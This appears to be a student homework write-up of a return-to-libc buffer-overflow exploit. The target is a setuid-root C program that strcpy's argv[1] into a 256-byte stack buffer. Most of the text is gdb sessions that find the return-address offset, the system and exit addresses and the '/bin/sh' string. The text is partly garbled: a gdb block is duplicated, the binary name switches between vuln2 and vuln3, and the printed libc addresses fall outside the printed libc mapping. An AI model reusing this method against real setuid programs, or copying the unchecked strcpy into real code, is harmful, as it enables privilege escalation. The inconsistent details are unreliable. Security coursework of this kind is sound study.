# Ret2libc
Here the goal is to exploit the following simple program, when compiled with the following commands:

```
vijay@kali> cat vuln2.c
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[]) {

  char buf[256];

  strcpy(buf, argv[1]);
  printf("Input: %s\n", buf);

  return 0;
}
vijay@kali> gcc -g -fno-stack-protector -mpreferred-stack-boundary=2 -o vuln2 vuln2.c
vijay@kali> sudo chown root vuln2
vijay@kali> sudo chgrp root vuln2
vijay@kali> sudo chmod +s vuln2
```

## Solution
### Instuctions to run
```
# exploit vuln2.c
$ make clean && make vuln2
$ python exploit2.py
```
### Explanation
First, I guessed the offset of return address. In the code, we have only one local variable char buf[256]; which is of 256 bytes size. So return address might be located at 256 + 4 (old ebp) bytes.

```
vijay@kali:~/hw3$ gdb vuln3 -q
Reading symbols from vuln3...done.
(gdb) run `python -c 'print "A" * 260 + "BBBB"'`
Starting program: /home/vijay/hw3/vuln3 `python -c 'print "A" * 260 + "BBBB"'`
Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb)

Next, I found the function addresses of system and exit functions as shown
below:

(gdb) p system
$1 = {<text variable, no debug info>} 0xb755d850 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb75516c0 <__GI_exit>
(gdb) info proc mappings
process 1691
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/vijay/hw3/vuln3
         0x8049000  0x804a000     0x1000        0x0 /home/vijay/hw3/vuln3
        0xb7e05000 0xb7fb2000   0x1ad000        0x0 /lib/i386-linux-gnu/libc-2.23.so
```

Next, I found the function addresses of system and exit functions as shown below:

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb755d850 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb75516c0 <__GI_exit>
(gdb) info proc mappings
process 1691
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/vijay/hw3/vuln3
         0x8049000  0x804a000     0x1000        0x0 /home/vijay/hw3/vuln3
        0xb7e05000 0xb7fb2000   0x1ad000        0x0 /lib/i386-linux-gnu/libc-2.23.so

Next, I searched for the location of "/bin/sh" string in /lib/i386-linux-gnu/libc-2.23.so:

vijay@kali:~/hw3$ strings -t x /lib/i386-linux-gnu/libc-2.23.so | grep /bin/sh
 158e64 /bin/sh

So "/bin/sh" string is located at 0xb7f5de64 location

(gdb) print/x 0xb7e05000 + 0x158e64
$1 = 0xb7f5de64
(gdb) x/1s 0xb7f5de64
0xb7f5de64:     "/bin/sh"
```

Finally, I crafted my payload to exploit vuln2.c. Please refer to exploit2.py for complete details of the payload.
